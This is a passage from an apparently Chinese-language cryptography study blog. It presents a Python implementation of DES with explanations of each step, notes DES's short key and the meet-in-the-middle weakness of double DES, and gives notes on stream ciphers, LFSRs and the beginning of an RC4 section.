class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>]]</span><br><span class="line"></span><br><span class="line">dic_p=[<span class="number">16</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">17</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">26</span>,<span class="number">5</span>,<span class="number">18</span>,<span class="number">31</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">14</span>,<span class="number">32</span>,<span class="number">27</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">19</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">25</span>]</span><br><span class="line"></span><br><span class="line">dic_n=[<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">dic_IP2=[<span class="number">40</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">24</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">55</span>,<span class="number">23</span>,<span class="number">63</span>,<span class="number">31</span>,<span class="number">38</span>,<span class="number">6</span>,<span class="number">46</span>,<span class="number">14</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">62</span>,<span class="number">30</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">45</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">21</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">36</span>,<span class="number">4</span>,<span class="number">44</span>,<span class="number">12</span>,<span class="number">52</span>,<span class="number">20</span>,<span class="number">60</span>,<span class="number">28</span>,<span class="number">35</span>,<span class="number">3</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">51</span>,<span class="number">19</span>,<span class="number">59</span>,<span class="number">27</span>,<span class="number">34</span>,<span class="number">2</span>,<span class="number">42</span>,<span class="number">10</span>,<span class="number">50</span>,<span class="number">18</span>,<span class="number">58</span>,<span class="number">26</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">41</span>,<span class="number">9</span>,<span class="number">49</span>,<span class="number">17</span>,<span class="number">57</span>,<span class="number">25</span>]</span><br></pre></td></tr></table></figure><h3 id="初始IP置换"><a href="#初始IP置换" class="headerlink" title="初始IP置换"></a>初始IP置换</h3><p>将初始明文字符转换为64位二进制，并进行第一次IP置换。</p><p>需要注意的就是在python中用format函数非常方便，没有bin函数开头的0b,在这里需要将转换的二进制字符补足8位（在左边补0即可）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_p</span><span class="params">(p)</span>:</span></span><br><span class="line">s1=<span class="string">""</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">b=<span class="string">'&#123;:08b&#125;'</span>.format(ord(p[i]))</span><br><span class="line">s1+=b</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">res+=s1[dic_IP[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="字符串的循环左移"><a href="#字符串的循环左移" class="headerlink" title="字符串的循环左移"></a>字符串的循环左移</h3><p>生成16个子密钥时需要循环左移函数，使用到的就是py的切片，先需要对密钥56位分为两部分，分别28位，然后这两部分分别循环左移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zuoyi</span><span class="params">(n,ki)</span>:</span></span><br><span class="line">temp=ki[n:len(ki)]</span><br><span class="line">temp=temp+ki[<span class="number">0</span>:n]</span><br><span class="line"><span class="keyword">return</span> temp</span><br></pre></td></tr></table></figure><h3 id="密钥初始编排-PC1"><a href="#密钥初始编排-PC1" class="headerlink" title="密钥初始编排-PC1"></a>密钥初始编排-PC1</h3><p>需要对输入的8个字符进行二进制转换并补足64位，然后将这64位字符进行PC-1置换，从64位置换为56位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_pc_1</span><span class="params">(k)</span>:</span></span><br><span class="line">k1=<span class="string">""</span></span><br><span class="line">k2=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">b=<span class="string">'&#123;:08b&#125;'</span>.format(ord(k[i]))</span><br><span class="line">k1+=b                            </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">56</span>):</span><br><span class="line">k2+=k1[dic_key1[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> k2</span><br></pre></td></tr></table></figure><h3 id="密钥二次编排-PC2"><a href="#密钥二次编排-PC2" class="headerlink" title="密钥二次编排-PC2"></a>密钥二次编排-PC2</h3><p>将每次循环左移的密钥组合后进行PC-2置换，由56位转换为48位，并存储</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_pc_2</span><span class="params">(k)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">res+=k[dic_key2[i]<span class="number">-1</span>]            <span class="comment">#将56位转换为48位</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="按位异或"><a href="#按位异或" class="headerlink" title="按位异或"></a>按位异或</h3><p>两个相同长度的字符进行按位异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(r_e,ki)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(r_e)):</span><br><span class="line">xor_res=int(r_e[i],<span class="number">10</span>)^int(ki[i],<span class="number">10</span>)</span><br><span class="line"><span class="keyword">if</span> xor_res==<span class="number">1</span>:</span><br><span class="line">res+=<span class="string">"1"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">res+=<span class="string">"0"</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="E盒扩展"><a href="#E盒扩展" class="headerlink" title="E盒扩展"></a>E盒扩展</h3><p>将转换为二进制的64位明文分成两部分，Li和Ri，需要将Ri从32位二进制置换为48位，需要经过E盒扩展</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_e</span><span class="params">(r)</span>:</span></span><br><span class="line">temp_r=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">temp_r+=(r[dic_e[i]<span class="number">-1</span>])          <span class="comment">#将32位扩展为48位</span></span><br><span class="line"><span class="keyword">return</span> temp_r</span><br></pre></td></tr></table></figure><h3 id="S盒处理"><a href="#S盒处理" class="headerlink" title="S盒处理"></a>S盒处理</h3><p>这里有8个S盒，从E盒出来的48位数据分为8组，每组6位，分别进入8个S盒，上面将这8个S盒分别装入列表，并将这8个列表装入一个大列表，类似于C++里的二维数组。</p><p>将6位中的首位和末位组合并转换为10进制，为行</p><p>将6位中剩下的4位组合转换为10进制，为列</p><p>查找到对应行列的S盒中的值，将其转换为二进制字符并存储在res中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_s</span><span class="params">(r)</span>:</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(r),<span class="number">6</span>):                     <span class="comment">#步长为6</span></span><br><span class="line">begins=r[i:i+<span class="number">6</span>]</span><br><span class="line">hang=int(begins[<span class="number">0</span>]+begins[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">lie=int(begins[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">num=<span class="string">'&#123;:04b&#125;'</span>.format(dic_s[j][<span class="number">16</span>*hang+lie])  <span class="comment">#将s盒中对应数字转为二进制字符串并补满4位</span></span><br><span class="line">res+=num</span><br><span class="line">j=j+<span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="P盒置换"><a href="#P盒置换" class="headerlink" title="P盒置换"></a>P盒置换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_p</span><span class="params">(r)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">res+=r[dic_p[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="生成16个子密钥"><a href="#生成16个子密钥" class="headerlink" title="生成16个子密钥"></a>生成16个子密钥</h3><p>64位密钥先经过pc1置换为56位，分成两部分，分别循环左移，组合后进行二次密钥编排，将产生的16个子密钥按序存储在keylist中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_list</span><span class="params">(key)</span>:</span></span><br><span class="line">temp_1=init_pc_1(key)</span><br><span class="line">k_l=temp_1[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">k_r=temp_1[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">k_l=zuoyi(dic_n[i],k_l)          <span class="comment">#前28位左移n</span></span><br><span class="line">k_r=zuoyi(dic_n[i],k_r)          <span class="comment">#后28位左移n</span></span><br><span class="line">key_yiwei=k_l+k_r</span><br><span class="line">key_res=init_pc_2(key_yiwei)</span><br><span class="line">keylist.append(key_res)</span><br></pre></td></tr></table></figure><h3 id="F函数-1"><a href="#F函数-1" class="headerlink" title="F函数"></a>F函数</h3><p>先E盒置换，再与子密钥异或，再S盒处理，最后进行P盒处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun_F</span><span class="params">(str1,key)</span>:</span></span><br><span class="line">res_e=box_e(str1)               </span><br><span class="line">res_xor=xor(res_e,key)</span><br><span class="line">res_s=box_s(res_xor)</span><br><span class="line">res_p=box_p(res_s)</span><br><span class="line"><span class="keyword">return</span> res_p</span><br></pre></td></tr></table></figure><h3 id="IP逆置换"><a href="#IP逆置换" class="headerlink" title="IP逆置换"></a>IP逆置换</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">IP_NI</span><span class="params">(c)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">res+=c[dic_IP2[i]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="加密一组"><a href="#加密一组" class="headerlink" title="加密一组"></a>加密一组</h3><p>8个字符的加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_encode_one_group</span><span class="params">(p,k)</span>:</span></span><br><span class="line">p_bin=init_p(p)        <span class="comment">#str 64</span></span><br><span class="line">p_left=p_bin[<span class="number">0</span>:<span class="number">32</span>]     <span class="comment">#str 32 left</span></span><br><span class="line">p_right=p_bin[<span class="number">32</span>:]     <span class="comment">#str 32 right</span></span><br><span class="line">key_list(k)          <span class="comment">#生成16个子密钥</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):    <span class="comment">#16轮迭代</span></span><br><span class="line">p_temp=p_right                  <span class="comment">#暂存</span></span><br><span class="line">fin_r=fun_F(p_right,keylist[i]) <span class="comment">#Ri经过F函数</span></span><br><span class="line">p_right=xor(fin_r,p_left)       <span class="comment">#Ri</span></span><br><span class="line">p_left=p_temp                   <span class="comment">#Li</span></span><br><span class="line">final_right=p_right</span><br><span class="line">final_left=xor(fun_F(p_right,keylist[<span class="number">15</span>]),p_left)</span><br><span class="line">fin=final_left+final_right</span><br><span class="line">fin=IP_NI(fin)</span><br><span class="line"><span class="keyword">return</span> fin</span><br></pre></td></tr></table></figure><h3 id="加密全部"><a href="#加密全部" class="headerlink" title="加密全部"></a>加密全部</h3><p>8个字符一组进行分组，每组分别进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_encode</span><span class="params">(p,k)</span>:</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> p[i:i+<span class="number">8</span>]!=<span class="string">""</span>:</span><br><span class="line">res+=DES_encode_one_group(p[i:i+<span class="number">8</span>],key)</span><br><span class="line">i=i+<span class="number">8</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="解密一组"><a href="#解密一组" class="headerlink" title="解密一组"></a>解密一组</h3><p>一组64位二进制进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_decode_one_group</span><span class="params">(c)</span>:</span></span><br><span class="line">cipher=<span class="string">""</span></span><br><span class="line"><span class="comment">#key_list(k)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">cipher+=c[dic_IP[i]<span class="number">-1</span>]        <span class="comment">#c经过IP1置换放入cipher</span></span><br><span class="line">cipher_left=cipher[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">cipher_right=cipher[<span class="number">32</span>:]</span><br><span class="line">i=<span class="number">15</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">cipher_temp=cipher_right</span><br><span class="line">cipher_right=xor(fun_F(cipher_right,keylist[i]),cipher_left)</span><br><span class="line">cipher_left=cipher_temp</span><br><span class="line">i=i<span class="number">-1</span></span><br><span class="line">fin_right=cipher_right</span><br><span class="line">fin_left=xor(fun_F(cipher_right,keylist[<span class="number">0</span>]),cipher_left)</span><br><span class="line">final=fin_left+fin_right</span><br><span class="line">final=IP_NI(final)</span><br><span class="line">ming=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>,<span class="number">8</span>):</span><br><span class="line">ming+=chr(int(final[x:x+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> ming</span><br></pre></td></tr></table></figure><h3 id="解密全部"><a href="#解密全部" class="headerlink" title="解密全部"></a>解密全部</h3><p>每组64位二进制，分组解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DES_decode</span><span class="params">(c)</span>:</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">res=<span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> c[i:i+<span class="number">64</span>]!=<span class="string">""</span>:</span><br><span class="line">res+=DES_decode_one_group(c[i:i+<span class="number">64</span>])</span><br><span class="line">i=i+<span class="number">64</span></span><br><span class="line"><span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="运行结果及正确性分析"><a href="#运行结果及正确性分析" class="headerlink" title="运行结果及正确性分析"></a>运行结果及正确性分析</h2><p>输入8个字符作为明文，8个字符作为密钥，得出密文为一串比特流，输入这串比特流，用上面生成的子密钥进行解密得到明文为先前输入的8个明文字符，验证了算法的正确性；</p><p><img src="https://s2.ax1x.com/2019/01/02/FI0I41.png" alt="FI0I41.png"></p><h2 id="算法安全性分析"><a href="#算法安全性分析" class="headerlink" title="算法安全性分析"></a>算法安全性分析</h2><p>一重DES算法的密钥过短，只有56位有效密钥位，所以不具备很高的安全性，下面分析中间相遇攻击；</p><p><strong>中间相遇攻击分析：</strong></p><p>在 DES 的基础上，衍生了以下两种加密方式</p><p>1.双重 DES，使用两个密钥，长度为112比特，加密方程为<code>C=Ek2(Ek1(P))</code>，但是双重DES是不可以抵抗中间相遇攻击的，构造如下,即分别枚举 K1 和 K2 分别对 P 进行加密和对 C 进行解密。</p><p><code>I=Ek1(P)</code>     <code>J=Dk2(C)</code></p><p>在我们对 P 进行加密完毕后，可以对加密结果进行排序，当我们对 C 进行解密时，可以每解密一个，就去对应的表中查询，看看是否相等，如此进行中间相遇攻击。计算量大概在2^56左右。和一重DES的复杂度相当；</p><p>2.三重DES，加密方式如下，3 个不同的密钥，k1，k2，k3 互相独立，一共 168 比特。可以抵御中间相遇攻击；</p><p><code>C=Ek3(Dk2(Ek1(P)))</code>    <code>P=Dk1(Ek2(Dk3(C)))</code></p><h2 id="有效性和合理性分析"><a href="#有效性和合理性分析" class="headerlink" title="有效性和合理性分析"></a>有效性和合理性分析</h2><p>DES 现在已经不被视为一种安全的加密算法，拿DES来进行加密已经认为是不合理的，主要原因是它使用的56位密钥过短，为了提供实用所需的安全性，可以使用 DES 的派生算法 三重DES 来进行加密，现在的三重DES是具备安全性的，可以抵抗中间相遇攻击，比较合理有效；</p><h2 id="算法编写过程中遇到的问题及解决"><a href="#算法编写过程中遇到的问题及解决" class="headerlink" title="算法编写过程中遇到的问题及解决"></a>算法编写过程中遇到的问题及解决</h2><p>1.算法编写过程中，Feistel网络密码结构中的子密钥每一轮都需要更新；</p><p>2.一开始写十六轮迭代时，直接就是写16轮循环，每次得到的R作为下次加密的L，而上一轮得到的异或结果作为R，这样得到的结果是错误的，因为Feistel网络密码结构中第16轮迭代时，右部分直接就是第十五轮得到的R15,左部分是R15经过F函数后与L15异或得到的，并不是简单的16轮重复迭代；</p><p>3.一开始的解密过程错误，是因为我直接简单的拿加密的算法当解密的算法了，没有观察到，解密时的每一轮迭代中，子密钥是从第16个到第1个倒序添加的，这点格外重要；</p><h1 id="序列密码笔记"><a href="#序列密码笔记" class="headerlink" title="序列密码笔记"></a>序列密码笔记</h1><h2 id="序列密码简单叙述"><a href="#序列密码简单叙述" class="headerlink" title="序列密码简单叙述"></a>序列密码简单叙述</h2><p>序列密码属于对称加密；它的加密用一个随机序列(密钥流)与明文序列按位加密产生密文，用同一随机序列与密文序列叠加来恢复明文序列密码为对称加密，一次只对明文消息的单个bit进行加密解密；一般密钥流的长度等于需要加密的密文的长度</p><p><a href="https://imgchr.com/i/F4zDhj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/01/F4zDhj.md.png" alt="F4zDhj.md.png"></a></p><p><strong>特点：</strong></p><ol><li>加解密运算只是简单的模二加（异或）运算</li><li>密码强度主要靠密钥流的随机性</li></ol><h2 id="序列密码加密解密过程"><a href="#序列密码加密解密过程" class="headerlink" title="序列密码加密解密过程"></a>序列密码加密解密过程</h2><p>1.密钥流产生于种子密钥，种子密钥K通过密钥流发生器产生密钥流<code>k=k0k1k2k3...kn-1</code></p><p>2.明文序列为<code>M=m0m1m2m3...m(n-1)</code></p><p>3.接下来就是K与M逐位异或得到C的序列<img src="https://s1.ax1x.com/2018/12/24/F6IdrF.png" alt="img"></p><p>4.解密不必多说，只要异或回去就好<img src="https://s1.ax1x.com/2018/12/24/F6Ifqe.png" alt="img"></p><p><strong>具体实现的流程图：</strong></p><p><img src="https://s1.ax1x.com/2018/12/24/F6IIIA.png" alt="img"></p><h2 id="序列密码的分类"><a href="#序列密码的分类" class="headerlink" title="序列密码的分类"></a>序列密码的分类</h2><h3 id="1-同步序列密码"><a href="#1-同步序列密码" class="headerlink" title="1.同步序列密码"></a>1.同步序列密码</h3><p>所谓同步序列密码指的是：密钥序列的产生独立于明文消息和密文消息；</p><p><strong>加密过程如下:</strong></p><p><img src="https://s1.ax1x.com/2018/12/24/F6TD91.png" alt="img"></p><p><code>f是状态函数，和密钥源产生必要得状态参数，g是产生密钥序列ki的函数，E是将ki与mi结合输出ci的函数</code></p><p><strong>模型：</strong></p><p><img src="https://s2.ax1x.com/2019/01/01/F4zC0U.png" alt="F4zC0U.png"><img src="https://s2.ax1x.com/2019/01/01/F4zP7F.png" alt="F4zP7F.png"></p><p><strong>特点：</strong></p><p>1.无错误传播：各符号之间真正独立。一个传播错误只影响一个符号，不会影响到后继的符号</p><p>2.同步：发送方和接收方必须保持精确的、用同样的密钥并作用在同样的位置上，才能正确的解密</p><h3 id="2-自同步序列密码"><a href="#2-自同步序列密码" class="headerlink" title="2.自同步序列密码"></a>2.自同步序列密码</h3><p>发双方中的任何一方，其密钥流的产生依赖于密文流；</p><p><strong>加密过程：</strong></p><p><a href="https://imgchr.com/i/F4zunK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/01/F4zunK.md.png" alt="F4zunK.md.png"></a></p><p><strong>模型：</strong></p><p><img src="https://s2.ax1x.com/2019/01/01/F4zM7D.png" alt="加密.png"><img src="https://s2.ax1x.com/2019/01/01/F4zlAe.png" alt="解密.png"></p><p><strong>特点：</strong></p><p>1.有限错误传播：设密钥序列产生器具有n位存储，则一个符号的传输错误只影响到后面n符号的解密</p><p>2.自同步：只要接收方连续收到n个正确的密文符号，密钥序列产生器便会自动地恢复同步 </p><p>3.消除明文统计特性</p><h2 id="线性反馈移位寄存器"><a href="#线性反馈移位寄存器" class="headerlink" title="线性反馈移位寄存器"></a>线性反馈移位寄存器</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>1.可以产生具有良好伪随机性的序列如：m序列，所以在序列密码中作为密钥序列的驱动序列</p><p>2.一个线性反馈移位寄存器由两部分组成：<strong>移位寄存器+反馈函数</strong></p><h3 id="游程"><a href="#游程" class="headerlink" title="游程"></a>游程</h3><p>游程就是指连续的1或0序列，游程长度是指连续的1或0序列的长度；</p><h3 id="移位寄存器"><a href="#移位寄存器" class="headerlink" title="移位寄存器"></a>移位寄存器</h3><p>移位寄存器是指有n个寄存器（称为n级移位寄存器）<code>r1,r2,…,rn</code>从右到左排列，每个寄存器中能存放1位二进制数，所有寄存器中的数可以统一向右（或向左）移动1位，称为进动1拍。即<code>r1</code>的值<code>(b1)</code>右移1位后输出，然后<code>r2</code>的值<code>(b2)</code>送<code>r1</code> ,<code>r3</code>的值<code>(b3)</code>送<code>r2</code>,……最后，<code>rn</code>的值<code>(bn)</code>送<code>rn-1</code></p><p><img src="https://s2.ax1x.com/2019/01/01/F5FfMj.png" alt="F5FfMj.png"></p><h3 id="反馈移位寄存器-FSR"><a href="#反馈移位寄存器-FSR" class="headerlink" title="反馈移位寄存器(FSR)"></a>反馈移位寄存器(FSR)</h3><p>反馈移位寄存器(feedback shift register,FSR)是由n位的寄存器和反馈函数(feedback function)组成，n位的寄存器中的初始值称为移位寄存器的初态</p><p><img src="https://s2.ax1x.com/2019/01/01/F5F4Ln.png" alt="F5F4Ln.png"></p><h3 id="线性反馈移位寄存器（LFSR）"><a href="#线性反馈移位寄存器（LFSR）" class="headerlink" title="线性反馈移位寄存器（LFSR）"></a>线性反馈移位寄存器（LFSR）</h3><p>LFSR是一种特殊的FSR，其反馈函数是移位寄存器中某些位的异或，参与运算的这些位叫做<strong><em>抽头位</em></strong>；</p><p><strong>特征：</strong></p><p>1.n级LFSR的有效状态为<code>(2^n)-1</code>（全0状态除外，因全0状态的输出序列一直为全0），也即理论上能够产生周期为<code>(2^n)-1</code>的伪随机序列。但要产生最大周期的输出序列，抽头位有一定要求;</p><p>2.为了使LFSR得到最大的周期(2^n)-1，其生成多项式（由抽头序列加上常数1形成的多项式）要是本原多项式，这样生成的序列叫做m序列</p><p><strong>本原多项式：</strong></p><p><a href="https://imgchr.com/i/F5AoCT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/01/F5AoCT.md.png" alt="F5AoCT.md.png"></a><br><strong>加解密：</strong></p><p>一个LFSR可以生成足够长的密钥二进制序列加密明文二进制序列，要解密密文，只需要运行具有相同初始状态的LFSR即可。</p><h1 id="序列密码RC4"><a href="#序列密码RC4" class="headerlink" title="序列密码RC4"></a>序列密码RC4</h1><h2 id="序列密码之RC4算法"><a href="#序列密码之RC4算法" class="headerlink" title="序列密码之RC4算法"></a>序列密码之RC4算法</h2><h3 id="简述-1"><a href="#简述-1" class="headerlink" title="简述"></a>简述</h3><p>在密码学中，<strong>RC4</strong>是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4软件容易实现，密钥长度可变，简单，但也很有效果。RC4 算法广泛应用于 SSL/TLS 协议和 WEP/WPA 协议。</p><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>RC4主要分为三个步骤，初始化 S 和 T 数组，初始化置换 S，生成密钥流。</p><h4 id="初始化S盒和T向量（初始化S和T）"><a 